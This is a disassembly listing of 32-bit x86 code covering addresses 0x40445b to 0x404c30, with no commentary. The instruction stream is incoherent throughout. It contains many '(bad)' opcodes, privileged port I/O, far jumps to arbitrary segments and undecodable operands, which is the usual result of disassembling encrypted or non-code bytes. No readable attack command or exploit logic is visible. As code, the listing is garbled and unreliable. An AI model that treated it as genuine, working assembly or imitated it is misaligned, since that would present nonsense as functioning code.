  40445b:	outs   dx,DWORD PTR ds:[esi]
  40445c:	sub    eax,0xcd303c03
  404461:	imul   ebp,DWORD PTR [ebx+0x27],0xffffffc5
  404465:	xlat   BYTE PTR ds:[ebx]
  404466:	mulps  xmm2,xmm3
  404469:	lea    ebp,[edi]
  40446b:	add    al,dh
  40446d:	fcomp  DWORD PTR [eax]
  40446f:	imul   esi,esp,0xf3d3f5ff
  404475:	ror    DWORD PTR [edx+0x58],1
  404478:	and    ch,BYTE PTR [ebx-0x8e07e2c]
  40447e:	add    BYTE PTR [edi-0x42],dh
  404481:	stos   DWORD PTR es:[edi],eax
  404482:	push   edx
  404483:	outs   dx,DWORD PTR ds:[esi]
  404484:	jne    0x40442b
  404486:	cld    
  404487:	mov    ?,WORD PTR [edx-0x12]
  40448a:	mov    ecx,0x65d21c54
  40448f:	loopne 0x404429
  404491:	jl     0x4044fc
  404493:	lds    esi,FWORD PTR [ecx-0x578d68f1]
  404499:	jne    0x4044f1
  40449b:	sub    ebp,DWORD PTR [ebx-0x41]
  40449e:	lock sbb BYTE PTR [edi],cl
  4044a1:	or     BYTE PTR [ebx-0x2adec47e],ah
  4044a7:	dec    esi
  4044a8:	scas   eax,DWORD PTR es:[edi]
  4044a9:	xor    BYTE PTR [ecx+eax*8-0x566bd694],bh
  4044b0:	or     DWORD PTR [esi],0x4f974e4a
  4044b6:	loopne 0x4044f9
  4044b8:	xor    al,0xdc
  4044ba:	and    DWORD PTR [edi+eiz*2+0x72],0xfffffffb
  4044bf:	or     eax,0xb37aac4d
  4044c4:	and    al,0x5a
  4044c6:	mov    edi,0xcc438191
  4044cb:	aaa    
  4044cc:	push   esi
  4044cd:	ins    DWORD PTR es:[edi],dx
  4044ce:	in     eax,dx
  4044cf:	mov    edx,0x676d4716
  4044d4:	xchg   DWORD PTR [esi+0xb8cb9d4],ecx
  4044da:	pop    es
  4044db:	arpl   WORD PTR [edx-0x1117fde],di
  4044e1:	clc    
  4044e2:	and    bh,BYTE PTR [edi+0x5d]
  4044e5:	push   ecx
  4044e6:	inc    ebp
  4044e7:	xor    bl,dh
  4044e9:	pop    ss
  4044ea:	outs   dx,BYTE PTR ds:[esi]
  4044eb:	mov    cs,WORD PTR [ecx]
  4044ed:	sub    DWORD PTR [eax],eax
  4044ef:	data16 xlat BYTE PTR ds:[ebx]
  4044f1:	push   ss
  4044f2:	pop    ebx
  4044f3:	pusha  
  4044f4:	rcl    bl,1
  4044f6:	stc    
  4044f7:	xchg   esi,eax
  4044f8:	pop    edx
  4044f9:	das    
  4044fa:	mov    ds:0xc1494bd9,eax
  4044ff:	adc    eax,0x7be31f9e
  404504:	dec    edx
  404505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404506:	pop    edi
  404507:	scas   al,BYTE PTR es:[edi]
  404508:	push   ebx
  404509:	push   0xecb50583
  40450e:	adc    eax,0xdc072aa6
  404513:	push   es
  404514:	pop    DWORD PTR [edi+0x6b]
  404517:	xchg   esp,eax
  404518:	test   al,0x97
  40451a:	imul   ebx,edx,0xd69bf014
  404520:	aaa    
  404521:	pop    ebp
  404522:	xchg   ecx,eax
  404523:	adc    DWORD PTR [esi-0x17],ecx
  404526:	je     0x404575
  404528:	repz mov cl,0xf5
  40452b:	xor    al,0xb5
  40452d:	cli    
  40452e:	mov    ch,0xb4
  404530:	into   
  404531:	out    dx,al
  404532:	pop    ebp
  404533:	data16 out dx,al
  404535:	add    al,0x2f
  404537:	jmp    0x7a7a:0xd533e39d
  40453e:	out    dx,eax
  40453f:	mov    cl,0xc
  404541:	rol    BYTE PTR [edi+0x5b],0x11
  404545:	stos   BYTE PTR es:[edi],al
  404546:	jl     0x40452c
  404548:	push   eax
  404549:	cld    
  40454a:	push   cs
  40454b:	jmp    0x40455d
  40454d:	retf   
  40454e:	retf   
  40454f:	icebp  
  404550:	mov    WORD PTR ds:0x9dc070ad,ds
  404556:	jp     0x404534
  404558:	push   edx
  404559:	mov    ch,0x2e
  40455b:	mov    bh,0xe0
  40455d:	lahf   
  40455e:	fsub   DWORD PTR [eax-0x68469e9b]
  404564:	mov    bl,0xe6
  404566:	push   ss
  404567:	mov    esi,DWORD PTR [ecx]
  404569:	and    al,0x13
  40456b:	and    eax,0x372852dc
  404570:	outs   dx,BYTE PTR ds:[esi]
  404571:	shr    DWORD PTR [eax],1
  404573:	jne    0x40457a
  404575:	push   es
  404576:	sub    cl,BYTE PTR [ebx+0x13]
  404579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40457a:	push   edx
  40457b:	rcr    BYTE PTR [esi],0xf
  40457e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40457f:	mov    ecx,0x983282ef
  404584:	fild   QWORD PTR [edx-0x62]
  404587:	out    dx,eax
  404588:	push   cs
  404589:	dec    esp
  40458a:	retf   
  40458b:	ret    
  40458c:	xor    BYTE PTR ds:0xf2049717,al
  404592:	aad    0x99
  404594:	add    DWORD PTR [ebx+edi*2+0x3d],esi
  404598:	adc    al,0x3
  40459a:	pop    esp
  40459b:	out    0xde,eax
  40459d:	mov    ah,0xad
  40459f:	mov    edx,0xfbafcce3
  4045a4:	cld    
  4045a5:	cmp    DWORD PTR [ecx+0x6542b726],ebx
  4045ab:	mov    ecx,0x752c5a22
  4045b0:	pusha  
  4045b1:	loope  0x40455a
  4045b3:	mov    ah,0x48
  4045b5:	scas   eax,DWORD PTR es:[edi]
  4045b6:	popf   
  4045b7:	out    0x1,al
  4045b9:	or     eax,0xd76e8d53
  4045be:	and    edi,0x67
  4045c1:	xchg   ecx,eax
  4045c2:	rcr    DWORD PTR [ebx+0x34],1
  4045c5:	and    BYTE PTR [edx-0x13],0x9f
  4045c9:	mov    BYTE PTR [edi+0x5],dh
  4045cc:	(bad)  
  4045ce:	or     DWORD PTR [ebx-0x4b],ebp
  4045d1:	xchg   DWORD PTR [ecx+0x7959b53e],edx
  4045d7:	inc    ecx
  4045d8:	inc    esp
  4045d9:	jmp    0xff9f:0x7fbb7fb5
  4045e0:	out    dx,al
  4045e1:	mov    eax,0x6a338167
  4045e6:	call   0xb39f5e73
  4045eb:	lahf   
  4045ec:	enter  0x49b3,0xba
  4045f0:	mov    ebx,0x4246578c
  4045f5:	imul   edx,DWORD PTR [eax+0x7a764fc7],0x9ad4cc35
  4045ff:	outs   dx,BYTE PTR ds:[esi]
  404600:	jg     0x404634
  404602:	add    eax,0xc319220e
  404607:	cmp    eax,0xea8a88ee
  40460c:	pop    eax
  40460d:	data16 std 
  40460f:	add    ax,0x7447
  404613:	(bad)  
  404614:	test   eax,0x63f194a9
  404619:	jo     0x404618
  40461b:	gs inc edx
  40461d:	out    dx,al
  40461e:	int    0x29
  404620:	arpl   WORD PTR ds:[esi+0x2b465f96],di
  404627:	mov    eax,0xea01ec99
  40462c:	retf   
  40462d:	aaa    
  40462e:	out    dx,al
  40462f:	dec    esp
  404630:	inc    ebp
  404631:	cdq    
  404632:	imul   ecx,DWORD PTR [eax],0xffffffaa
  404635:	dec    ebp
  404636:	in     eax,0xdb
  404638:	in     eax,0xcf
  40463a:	sbb    DWORD PTR ss:0x512a4be7,esi
  404641:	pusha  
  404642:	and    eax,0x2ff2141a
  404647:	cmp    al,BYTE PTR [ebx]
  404649:	mov    edx,esp
  40464b:	es leave 
  40464d:	cmp    eax,0x7c2934ec
  404652:	mov    dl,0x3d
  404654:	cmp    BYTE PTR [ebx-0x7c6ad598],dl
  40465a:	sub    dh,BYTE PTR [ebx]
  40465c:	nop
  40465d:	in     al,dx
  40465e:	mov    eax,0x7992b9ce
  404663:	mov    ds:0xc4312d99,eax
  404668:	(bad)  
  404669:	fidivr DWORD PTR [edx-0x6ef48059]
  40466f:	adc    DWORD PTR [ebp+0x5b6a92d6],esp
  404675:	(bad)  
  404676:	mov    ch,0x87
  404678:	fdivr  st,st(0)
  40467a:	xchg   edi,eax
  40467b:	jnp    0x404645
  40467d:	adc    DWORD PTR [ecx-0x2999914d],0x65393cd9
  404687:	and    BYTE PTR [ebp-0x6edce02a],bh
  40468d:	adc    al,0xa1
  40468f:	scas   eax,DWORD PTR es:[edi]
  404690:	adc    ch,bl
  404692:	mov    edi,0x3b846b6
  404697:	or     al,0xec
  404699:	and    al,0x86
  40469b:	es push ebp
  40469d:	jp     0x404693
  40469f:	pop    esp
  4046a1:	fistp  WORD PTR [edx+0x5b69a6a]
  4046a7:	or     al,0x1c
  4046a9:	mov    al,ds:0xde617ea
  4046ae:	mov    al,0xe7
  4046b0:	fcom   st(5)
  4046b2:	push   ebp
  4046b3:	mov    ah,0x19
  4046b5:	dec    eax
  4046b6:	inc    esp
  4046b7:	je     0x404682
  4046b9:	stc    
  4046ba:	add    al,0x6
  4046bc:	adc    edx,DWORD PTR [edx-0x173eb15b]
  4046c2:	dec    eax
  4046c3:	xor    dh,BYTE PTR ds:0x3fe40e7
  4046c9:	and    edx,DWORD PTR [edx-0x536f6bec]
  4046cf:	dec    ebp
  4046d0:	mov    dh,0xb1
  4046d2:	pop    ss
  4046d3:	mov    eax,0xa94ffe1e
  4046d8:	stos   DWORD PTR es:[edi],eax
  4046d9:	jns    0x40474a
  4046db:	push   0x24d89177
  4046e0:	int3   
  4046e1:	cdq    
  4046e2:	jle    0x4046bb
  4046e4:	dec    edi
  4046e5:	rol    BYTE PTR ds:0x6644d261,0x94
  4046ec:	scas   eax,DWORD PTR es:[edi]
  4046ed:	mov    ch,0x80
  4046ef:	inc    ecx
  4046f0:	push   ds
  4046f1:	pop    edi
  4046f2:	inc    eax
  4046f3:	ror    edx,0x55
  4046f6:	mov    ecx,DWORD PTR [ecx+ebx*4-0x18]
  4046fa:	popf   
  4046fb:	sbb    BYTE PTR [ebx],dl
  4046fd:	mov    esp,0x5951a6b1
  404702:	mov    dh,0xa1
  404704:	cmc    
  404705:	jle    0x404734
  404707:	test   BYTE PTR [esi-0x745025bb],0x30
  40470e:	je     0x4046d9
  404710:	hlt    
  404711:	scas   eax,DWORD PTR es:[edi]
  404712:	jle    0x404744
  404714:	fxch   st(1)
  404716:	call   0xf5d:0x8d1347b0
  40471d:	js     0x4046d9
  40471f:	push   edx
  404720:	loope  0x4046bd
  404722:	loopne 0x40470f
  404724:	ja     0x40477d
  404726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404727:	lods   eax,DWORD PTR ds:[esi]
  404728:	jmp    0xf2204f6
  40472d:	sbb    eax,0x23ae4812
  404732:	fsub   st(0),st
  404734:	push   0x5c428532
  404739:	stc    
  40473a:	cmp    BYTE PTR [ebx-0x7ef420f],dh
  404740:	ficomp DWORD PTR [edi+0x17]
  404743:	dec    edx
  404744:	adc    al,0x2
  404746:	jo     0x40473e
  404748:	clc    
  404749:	arpl   WORD PTR [ecx-0x7b],bp
  40474c:	push   ecx
  40474d:	retf   
  40474e:	xchg   edx,eax
  40474f:	inc    edx
  404750:	mov    ds:0x789cb7ab,al
  404755:	mov    ch,0x40
  404757:	and    al,0x35
  404759:	(bad)  
  40475a:	and    DWORD PTR [ebp+eiz*4+0x59],ecx
  40475e:	lds    edi,FWORD PTR [edi-0x69]
  404761:	inc    ebx
  404762:	push   esi
  404763:	dec    BYTE PTR [ebx-0x1e6a39ca]
  404769:	add    DWORD PTR [ecx-0x3bc23409],0x7889089c
  404773:	sub    DWORD PTR [esi+0x20],ebp
  404776:	sbb    al,0xf7
  404778:	mov    dl,0xa4
  40477a:	jge    0x4047ca
  40477c:	call   0x5e98:0x37a66276
  404783:	repz sub al,0x96
  404786:	js     0x4047fe
  404788:	cmp    ebx,DWORD PTR [eax]
  40478a:	mov    ebp,0xeceb4348
  40478f:	mov    BYTE PTR [ebx-0x42c2ca1d],bl
  404795:	lea    esp,[ebx]
  404797:	push   edi
  404798:	cmp    al,0xab
  40479a:	push   eax
  40479b:	mov    cl,dh
  40479d:	fwait
  40479e:	jo     0x4047dd
  4047a0:	pop    eax
  4047a1:	ficomp WORD PTR [esi]
  4047a3:	mov    eax,0x2580a575
  4047a8:	cmp    al,bl
  4047aa:	mov    BYTE PTR [ebp-0x4a],cl
  4047ad:	in     al,dx
  4047ae:	dec    edx
  4047af:	dec    ebx
  4047b0:	add    al,BYTE PTR [ebp+0xb24bd4c]
  4047b6:	cmp    edx,0x86347946
  4047bc:	cmp    ecx,esp
  4047be:	cmp    DWORD PTR [esi+edx*8-0x4e5c26d5],eax
  4047c5:	pushf  
  4047c6:	lods   al,BYTE PTR ds:[esi]
  4047c7:	ret    
  4047c8:	push   ebp
  4047c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047ca:	and    DWORD PTR [edi+0x74b76e8b],edi
  4047d0:	jne    0x4047be
  4047d2:	sbb    eax,0x6d0db3f6
  4047d7:	mov    ch,0x8
  4047d9:	mov    ds,WORD PTR [eax+0x2519000c]
  4047df:	pop    ebx
  4047e0:	mov    bh,0xfe
  4047e2:	int    0x18
  4047e4:	xor    BYTE PTR [edx-0x15],0x2a
  4047e8:	xor    eax,0x642f7fe9
  4047ed:	ror    edi,0x1e
  4047f0:	jnp    0x404809
  4047f2:	xor    cl,ah
  4047f4:	lods   eax,DWORD PTR ds:[esi]
  4047f5:	sub    BYTE PTR [esi+0x540de2f8],al
  4047fb:	pusha  
  4047fc:	add    bh,al
  4047fe:	cld    
  4047ff:	jecxz  0x404831
  404801:	mov    esp,ebp
  404803:	push   ss
  404804:	(bad)  [eax+edi*4]
  404807:	or     esp,DWORD PTR [esp+ecx*8+0x49]
  40480b:	lds    ecx,FWORD PTR [ebp+ebx*1-0x1ac6635a]
  404812:	mov    ch,0x23
  404814:	dec    ebp
  404815:	aad    0xc5
  404817:	lahf   
  404818:	in     eax,0xf
  40481a:	jecxz  0x404891
  40481c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40481d:	push   ds
  40481e:	jno    0x40488e
  404820:	sbb    ch,BYTE PTR [ecx]
  404822:	sbb    al,0xa5
  404824:	cmp    eax,0xea2429e9
  404829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40482a:	cmp    DWORD PTR [edx],esp
  40482c:	push   ss
  40482d:	sub    al,0x40
  40482f:	or     DWORD PTR fs:[ebx],edi
  404832:	sar    DWORD PTR [edi+0x5],cl
  404835:	nop
  404836:	mov    ebx,0xe2fe5508
  40483b:	add    al,0x78
  40483d:	mov    edi,0x1f7b0a58
  404842:	enter  0x678,0x9e
  404846:	arpl   sp,cx
  404848:	(bad)  
  404849:	out    dx,eax
  40484a:	outs   dx,BYTE PTR ds:[esi]
  40484b:	jnp    0x4048c5
  40484d:	adc    al,0x6f
  40484f:	mov    al,0x1c
  404851:	je     0x404873
  404853:	fist   DWORD PTR [ecx]
  404855:	mov    ebx,DWORD PTR [ecx-0x304e650]
  40485b:	pop    eax
  40485c:	xchg   ebx,eax
  40485d:	dec    edi
  40485e:	cwde   
  40485f:	lock add edx,DWORD PTR [eax-0x1838be20]
  404866:	pop    ebp
  404867:	test   al,0xad
  404869:	fdivrp st(7),st
  40486b:	shr    edi,cl
  40486d:	cld    
  40486e:	lds    edi,FWORD PTR [esi]
  404870:	adc    esp,ebx
  404872:	sbb    ebx,DWORD PTR [eax-0x8630e71]
  404878:	push   es
  404879:	add    BYTE PTR [ecx],0xc6
  40487c:	pop    es
  40487d:	jp     0x4048f1
  40487f:	dec    edi
  404880:	inc    ebx
  404881:	pop    es
  404882:	frstor [edx]
  404884:	cld    
  404885:	fimul  WORD PTR [eax+0x21]
  404888:	outs   dx,DWORD PTR ds:[esi]
  404889:	sub    eax,0x1edf1f4c
  40488e:	push   edi
  40488f:	sbb    eax,0xf20ddb65
  404894:	mov    dl,0x75
  404896:	xor    BYTE PTR [esi+0x79bd0951],ah
  40489c:	stos   BYTE PTR es:[edi],al
  40489d:	sub    dl,BYTE PTR [eax+0xcc1ddc6]
  4048a3:	lea    ecx,[esi+0x172cd7ad]
  4048a9:	jl     0x404858
  4048ab:	xchg   esi,eax
  4048ac:	aaa    
  4048ad:	sbb    eax,0x5a2a5a8c
  4048b2:	imul   edx,DWORD PTR [edi+0x2c2ccd6b],0x7a
  4048b9:	push   cs
  4048ba:	cmp    al,dl
  4048bc:	mov    dl,0x93
  4048be:	pop    ebx
  4048bf:	retf   
  4048c0:	cdq    
  4048c1:	daa    
  4048c2:	and    BYTE PTR [edx+0x62],dl
  4048c5:	(bad)  
  4048c6:	cmp    ecx,DWORD PTR [ebx]
  4048c8:	inc    esi
  4048c9:	add    edx,DWORD PTR [edi+0x59e86e27]
  4048cf:	mov    ?,WORD PTR [edx-0x974f1fa]
  4048d5:	loope  0x4048b9
  4048d7:	inc    eax
  4048d8:	dec    ebp
  4048d9:	sub    ebp,edx
  4048db:	shl    DWORD PTR [eax],cl
  4048dd:	xchg   esi,eax
  4048de:	les    esi,FWORD PTR [edx]
  4048e0:	call   0x321b:0xa20bb949
  4048e7:	jmp    0xe10a:0x3a5628e8
  4048ee:	inc    edi
  4048ef:	outs   dx,DWORD PTR ds:[esi]
  4048f0:	in     eax,0xa8
  4048f2:	clc    
  4048f3:	sbb    ch,BYTE PTR [ebx+0x5f0a9a4]
  4048f9:	xchg   esi,eax
  4048fa:	jne    0x4048f7
  4048fc:	sbb    bh,BYTE PTR [eax+0x2b83e9f9]
  404902:	es pop esi
  404904:	scas   al,BYTE PTR es:[edi]
  404905:	xor    ah,BYTE PTR [eax+0x1aa08fec]
  40490b:	sbb    al,0x45
  40490d:	sbb    al,0x97
  40490f:	adc    eax,0xf09ea324
  404914:	pop    ebp
  404915:	icebp  
  404916:	ret    0xe313
  404919:	pop    ds
  40491a:	popa   
  40491b:	(bad)  
  40491c:	fisub  DWORD PTR [eax]
  40491e:	sub    al,0x7e
  404920:	data16 sbb BYTE PTR [edi],0xd6
  404924:	xor    eax,0x2269edc3
  404929:	ins    DWORD PTR es:[edi],dx
  40492a:	ja     0x404942
  40492c:	repz shl BYTE PTR [ebx-0x2d],1
  404930:	mov    BYTE PTR ss:[ebp-0x2d],ah
  404934:	cmp    bl,dh
  404936:	mov    ds:0x15af972,al
  40493b:	in     al,0xa2
  40493d:	dec    ebx
  40493e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40493f:	inc    esi
  404940:	ins    DWORD PTR es:[edi],dx
  404941:	rcr    bl,cl
  404943:	fidivr WORD PTR [esi+eax*1+0xb9f7e95]
  40494a:	lock lock in eax,dx
  40494d:	mov    ah,0xfd
  40494f:	jns    0x40492a
  404951:	sbb    eax,0x29ee5a13
  404956:	pop    DWORD PTR [esi+eiz*2-0x14]
  40495a:	sbb    cl,ah
  40495c:	sbb    eax,0x367eef6e
  404961:	sbb    BYTE PTR [ecx+0x8],dl
  404964:	loop   0x4049de
  404966:	inc    ebx
  404967:	(bad)  
  404968:	test   eax,0xcf21fb3d
  40496d:	call   edi
  40496f:	nop
  404970:	xchg   DWORD PTR [esi],ebp
  404972:	cmp    ch,BYTE PTR [ecx+0x2cc646fb]
  404978:	pushf  
  404979:	dec    ebp
  40497a:	(bad)  
  40497b:	in     al,dx
  40497c:	ja     0x404976
  40497e:	in     eax,dx
  40497f:	test   eax,0xcab0846
  404984:	jle    0x40491f
  404986:	les    ebp,FWORD PTR [ebx*2-0x81ff0b8]
  40498d:	xchg   esi,eax
  40498e:	sub    DWORD PTR [ebx],ebp
  404990:	(bad)  
  404991:	sbb    DWORD PTR [edi+ebx*1],edi
  404994:	xchg   esi,eax
  404995:	or     eax,0x6fe32918
  40499a:	sahf   
  40499b:	or     al,0xaf
  40499d:	aaa    
  40499e:	jecxz  0x4049f9
  4049a0:	jg     0x4049e8
  4049a2:	clc    
  4049a3:	pop    ds
  4049a4:	aaa    
  4049a5:	stos   DWORD PTR es:[edi],eax
  4049a6:	sahf   
  4049a7:	mov    eax,0x52c25b5b
  4049ac:	into   
  4049ad:	inc    ecx
  4049ae:	jns    0x4049ab
  4049b0:	and    eax,0xa88d4e1
  4049b5:	pusha  
  4049b6:	xchg   esp,eax
  4049b7:	inc    edi
  4049b8:	out    0xcb,eax
  4049ba:	sub    DWORD PTR [edi],ebp
  4049bc:	or     DWORD PTR [edx+eax*2+0xf94d200],esi
  4049c3:	jmp    0x59e9798c
  4049c8:	or     eax,0xdfe5bcc2
  4049cd:	fimul  WORD PTR [ebp-0x27]
  4049d0:	(bad)  [eax+0x167194d9]
  4049d6:	dec    esp
  4049d7:	pop    ebx
  4049d8:	mov    ecx,0xd9e0a77e
  4049dd:	mov    DWORD PTR [esi],esp
  4049df:	xor    al,0xa
  4049e1:	int3   
  4049e2:	(bad)  
  4049e3:	je     0x404a15
  4049e5:	xchg   BYTE PTR [ebp+0x8],al
  4049e8:	ja     0x4049f0
  4049ea:	in     eax,0x34
  4049ec:	cmp    esp,ebp
  4049ee:	push   esi
  4049ef:	fmul   st(5),st
  4049f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f2:	mov    ah,0xb9
  4049f4:	bound  edi,QWORD PTR [edi-0x4fba60c2]
  4049fa:	je     0x404a27
  4049fc:	sub    ecx,DWORD PTR [edx-0x48]
  4049ff:	sub    al,0xe0
  404a01:	cmp    al,0xfb
  404a03:	and    al,dh
  404a05:	adc    BYTE PTR [esi-0xe5a8cb1],cl
  404a0b:	adc    BYTE PTR [edx],0x4
  404a0e:	outs   dx,DWORD PTR ds:[esi]
  404a0f:	or     ebx,DWORD PTR [eax-0x1c]
  404a12:	inc    ebx
  404a13:	cwde   
  404a14:	and    BYTE PTR [edi-0x3b],cl
  404a17:	jmp    0x370f5c76
  404a1c:	pop    ebx
  404a1d:	int    0xc2
  404a1f:	push   0x50
  404a21:	(bad)  [ebp-0x1]
  404a24:	lock dec esp
  404a26:	jmp    0x3060e872
  404a2b:	push   0x57
  404a2d:	adc    al,bl
  404a2f:	aas    
  404a30:	imul   DWORD PTR [edx+0x77]
  404a33:	add    ebx,DWORD PTR [eax]
  404a35:	jae    0x404a78
  404a37:	mov    ch,0xf
  404a39:	(bad)  
  404a3a:	push   ecx
  404a3b:	sbb    eax,DWORD PTR [edi-0x59576a5c]
  404a41:	pop    cx
  404a43:	xlat   BYTE PTR ds:[ebx]
  404a44:	call   0x9261:0x951957b7
  404a4b:	lds    esi,FWORD PTR [eax+ebx*8-0x1b5f732f]
  404a52:	mov    ebx,0xe3d01916
  404a57:	adc    bl,al
  404a59:	sbb    ebp,DWORD PTR [ebx-0x20]
  404a5c:	jecxz  0x404a8c
  404a5e:	fmul   DWORD PTR fs:[edi-0x66]
  404a62:	bound  ebp,QWORD PTR [eax+0x69]
  404a65:	dec    edx
  404a66:	or     ecx,ebp
  404a68:	das    
  404a69:	mov    bl,0x6c
  404a6b:	lea    edi,[eax-0x22]
  404a6e:	and    esi,DWORD PTR [eax]
  404a70:	inc    esp
  404a71:	xlat   BYTE PTR ds:[ebx]
  404a72:	jl     0x404a9c
  404a74:	les    edi,FWORD PTR [eax]
  404a76:	jge    0x404a6f
  404a78:	xchg   BYTE PTR [ecx],al
  404a7a:	fwait
  404a7b:	mov    eax,0xb796c4b
  404a80:	(bad)  
  404a81:	cmp    BYTE PTR [ecx+esi*1],cl
  404a84:	or     al,0x67
  404a86:	call   0xf91ed4f4
  404a8b:	mov    cl,BYTE PTR [edi-0x43]
  404a8e:	xchg   esi,eax
  404a8f:	cmp    BYTE PTR [edi],0xbc
  404a92:	add    edx,esi
  404a94:	ins    DWORD PTR es:[edi],dx
  404a95:	push   esp
  404a96:	mov    eax,ds:0xd93cce0
  404a9b:	sahf   
  404a9c:	push   edi
  404a9d:	pop    ds
  404a9e:	ja     0x404a4c
  404aa0:	mov    edi,DWORD PTR [esi+0x11fc5e41]
  404aa6:	loop   0x404b11
  404aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aa9:	scas   al,BYTE PTR es:[edi]
  404aaa:	jb     0x404ae9
  404aac:	packsswb mm2,mm5
  404aaf:	rcr    DWORD PTR gs:[esi+0x2d],cl
  404ab3:	test   eax,0x4c846532
  404ab9:	enter  0x3301,0xd4
  404abd:	jmp    0xbcadfa33
  404ac2:	popa   
  404ac3:	cmc    
  404ac4:	js     0x404aee
  404ac6:	jno    0x404ac5
  404ac8:	sbb    esi,edi
  404aca:	rcl    DWORD PTR [eax],cl
  404acc:	jnp    0x404a52
  404ace:	aad    0x3d
  404ad0:	and    BYTE PTR [edx+0x172e66d],cl
  404ad6:	out    0xb5,eax
  404ad8:	push   es
  404ad9:	inc    esp
  404ada:	cli    
  404adb:	and    al,0xb0
  404add:	in     eax,dx
  404ade:	(bad)  
  404adf:	xchg   esp,eax
  404ae0:	or     esp,eax
  404ae2:	xchg   BYTE PTR [ecx-0x13],dl
  404ae5:	shr    DWORD PTR [edx-0x6],cl
  404ae8:	mov    ds:0xf516d5d,eax
  404aed:	mov    ecx,0xbc6c45b9
  404af2:	jmp    FWORD PTR [esi]
  404af4:	cwde   
  404af5:	(bad)  
  404af6:	fcos   
  404af8:	add    al,0x73
  404afa:	cmp    DWORD PTR [eax-0x40],esp
  404afd:	ds mov ebx,0x90c3acab
  404b03:	jns    0x404b1a
  404b05:	out    dx,eax
  404b06:	sar    DWORD PTR [edx-0x40534f45],1
  404b0c:	iret   
  404b0d:	sbb    BYTE PTR [edi+0x1b59238e],al
  404b13:	inc    edx
  404b14:	mov    BYTE PTR [edx+edi*1+0x6e],cl
  404b18:	ret    0x20cf
  404b1b:	xchg   edx,eax
  404b1c:	cmp    eax,DWORD PTR [edx+0x7d]
  404b1f:	jns    0x404b3a
  404b21:	xchg   edx,eax
  404b22:	sub    esp,ecx
  404b24:	mov    bh,0x12
  404b26:	sbb    eax,DWORD PTR [eax-0x524f21f5]
  404b2c:	cmp    ebp,DWORD PTR [edx]
  404b2e:	and    DWORD PTR [ebp+0x3f69199d],ebp
  404b34:	mov    esp,0x43160b47
  404b39:	pop    ss
  404b3a:	xlat   BYTE PTR ds:[ebx]
  404b3b:	cmp    esi,DWORD PTR [ecx-0x65]
  404b3e:	daa    
  404b3f:	inc    eax
  404b40:	jge    0x404ad6
  404b42:	call   0x81cf:0xee32ea29
  404b49:	mov    cl,0x74
  404b4b:	rcr    DWORD PTR [esi+0x14f88114],cl
  404b51:	inc    ebp
  404b52:	jae    0x404b54
  404b54:	inc    edi
  404b55:	push   ds
  404b56:	pop    ecx
  404b57:	and    BYTE PTR [ecx+0x7d],bl
  404b5a:	mov    bl,0xc5
  404b5c:	(bad)  
  404b5e:	sbb    dh,BYTE PTR [ebx]
  404b60:	sub    ah,dl
  404b62:	scas   eax,DWORD PTR es:[edi]
  404b63:	jo     0x404b95
  404b65:	adc    ebx,eax
  404b67:	mov    ecx,0xaac96052
  404b6c:	jle    0x404af2
  404b6e:	in     eax,0x86
  404b70:	sub    BYTE PTR [eax+0x540f4c58],0x5b
  404b77:	into   
  404b78:	dec    ebx
  404b79:	add    BYTE PTR [ebp-0x45],ch
  404b7c:	push   esi
  404b7d:	nop
  404b7e:	pusha  
  404b7f:	mov    eax,ds:0x4b50e3c4
  404b84:	xchg   DWORD PTR [edi],esi
  404b86:	add    DWORD PTR [esi+0x35],esp
  404b89:	push   0x47ddf238
  404b8e:	test   BYTE PTR [ebx-0x32],dh
  404b91:	mov    edi,DWORD PTR [eax]
  404b93:	or     al,0x56
  404b95:	cdq    
  404b96:	in     eax,dx
  404b97:	adc    DWORD PTR [ebx+eax*8-0x57],eax
  404b9b:	jl     0x404b26
  404b9d:	fscale 
  404b9f:	push   ebx
  404ba0:	and    dh,bh
  404ba2:	call   0x5718f600
  404ba7:	aaa    
  404ba8:	imul   esp
  404baa:	pop    esi
  404bab:	pop    edx
  404bac:	push   ss
  404bad:	ins    DWORD PTR es:[edi],dx
  404bae:	rcl    ah,cl
  404bb0:	test   eax,ebp
  404bb2:	mov    al,ds:0x7273b144
  404bb7:	push   ds
  404bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb9:	and    ebx,DWORD PTR [ecx-0x3e]
  404bbc:	sub    al,0xe8
  404bbe:	inc    ecx
  404bbf:	mov    al,0x51
  404bc1:	xchg   BYTE PTR [ebx-0x4d],ch
  404bc4:	clc    
  404bc5:	jno    0x404c04
  404bc7:	es jnp 0x404b64
  404bca:	push   esp
  404bcb:	test   BYTE PTR [edi],cl
  404bcd:	(bad)  
  404bcf:	sbb    DWORD PTR [eax],ecx
  404bd1:	cmp    ch,BYTE PTR [edi+0x658bd531]
  404bd7:	and    ah,BYTE PTR [edx+ebp*1]
  404bda:	rol    BYTE PTR [ebp-0x2a],0x5e
  404bde:	popf   
  404bdf:	cdq    
  404be0:	mov    gs,WORD PTR [ebx]
  404be2:	enter  0x76c,0x40
  404be6:	mov    al,BYTE PTR [esi]
  404be8:	gs pop cx
  404beb:	jae    0x404c17
  404bed:	imul   ebp,DWORD PTR [eax+0x56e8919f],0xbfd3a053
  404bf7:	jne    0x404ba5
  404bf9:	pop    ebx
  404bfa:	pop    edi
  404bfb:	inc    esi
  404bfc:	les    bp,DWORD PTR [esi-0x34e4a104]
  404c03:	add    BYTE PTR [eax+edi*2+0x7f],0x5a
  404c08:	clc    
  404c09:	xor    DWORD PTR [esp+edx*1],ebp
  404c0c:	outs   dx,BYTE PTR ds:[esi]
  404c0d:	mov    esi,0x6d3297e2
  404c12:	add    al,0x36
  404c14:	pop    ebx
  404c15:	fwait
  404c16:	sub    edi,DWORD PTR [edi*2+0x5769b8fd]
  404c1d:	jmp    0x404c40
  404c1f:	xchg   esp,eax
  404c20:	add    eax,0x5f9a1aae
  404c25:	mov    eax,0xd50aeeb0
  404c2a:	mov    al,ds:0xf98824c1
  404c2f:	stos   DWORD PTR es:[edi],eax
  404c30:	lahf   
